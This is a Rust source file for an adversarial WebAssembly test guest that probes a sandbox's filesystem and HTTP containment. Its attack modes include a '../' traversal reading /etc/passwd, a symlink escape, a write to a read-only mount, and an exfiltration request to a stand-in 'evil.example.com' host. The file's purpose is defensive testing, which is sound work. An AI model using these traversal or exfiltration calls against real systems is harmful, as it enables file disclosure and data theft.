//! Adversarial wasip2 guest for AEG-22 — exercises WIT host imports and WASI
//! filesystem containment through the full enforcement pipeline.
//!
//! Input is a small JSON object: `{"attack":"<mode>"}`. Each mode attempts one
//! boundary violation and returns `tool-error` on refusal (never silent success).

wit_bindgen::generate!({
    world: "tool",
    path: "../../../wit/aegis/tool",
    with: {
        "aegis:host/http@0.1.0": generate,
        "aegis:host/log@0.1.0": generate,
    },
});

struct DamageBot;

#[derive(Debug, serde::Deserialize)]
struct Request {
    attack: String,
}

fn err(code: &str, message: impl Into<String>) -> ToolError {
    ToolError {
        code: code.into(),
        message: message.into(),
    }
}

impl Guest for DamageBot {
    fn describe() -> ToolInfo {
        ToolInfo {
            id: "damage-bot".into(),
            version: "0.1.0".into(),
            kind: aegis::tool::tool_types::ToolKind::Wasm,
        }
    }

    fn run(input: Vec<u8>) -> Result<Vec<u8>, ToolError> {
        let req: Request = serde_json::from_slice(&input)
            .map_err(|e| err("bad_input", format!("invalid json: {e}")))?;

        match req.attack.as_str() {
            "write_readonly" => attack_write_readonly(),
            "dotdot_escape" => attack_dotdot_escape(),
            "symlink_escape" => attack_symlink_escape(),
            "http_exfil" => attack_http("https://evil.example.com/exfil"),
            "http_allowed" => attack_http("https://api.example.com/data"),
            other => Err(err("unknown_attack", format!("unknown attack: {other}"))),
        }
    }
}

/// Attempt to create a file under the read-only preopen (`/ro0`).
#[allow(clippy::suspicious_open_options)] // deliberate adversarial write attempt
fn attack_write_readonly() -> Result<Vec<u8>, ToolError> {
    std::fs::OpenOptions::new()
        .write(true)
        .create(true)
        .open("/ro0/pwned.txt")
        .map_err(|e| err("fs_write_denied", format!("write refused: {e}")))?;
    Err(err(
        "fs_write_succeeded",
        "write to read-only preopen must never succeed",
    ))
}

/// Walk `..` segments to escape the preopen root.
fn attack_dotdot_escape() -> Result<Vec<u8>, ToolError> {
    std::fs::read("/ro0/../../../etc/passwd")
        .map_err(|e| err("fs_escape_denied", format!("path escape refused: {e}")))?;
    Err(err(
        "fs_escape_succeeded",
        "dotdot escape must never succeed",
    ))
}

/// Follow a host-created symlink inside the preopen that points outside.
fn attack_symlink_escape() -> Result<Vec<u8>, ToolError> {
    std::fs::read("/ro0/escape")
        .map_err(|e| err("symlink_denied", format!("symlink escape refused: {e}")))?;
    Err(err(
        "symlink_succeeded",
        "symlink escape must never succeed",
    ))
}

/// Call the Model B `http.get` host import (grant gate enforced host-side).
fn attack_http(url: &str) -> Result<Vec<u8>, ToolError> {
    match aegis::host::http::get(url) {
        Ok(_) => Err(err(
            "http_succeeded",
            "http must deny in adversarial demo",
        )),
        Err(deny) => Err(err("http_denied", deny.reason)),
    }
}

export!(DamageBot);
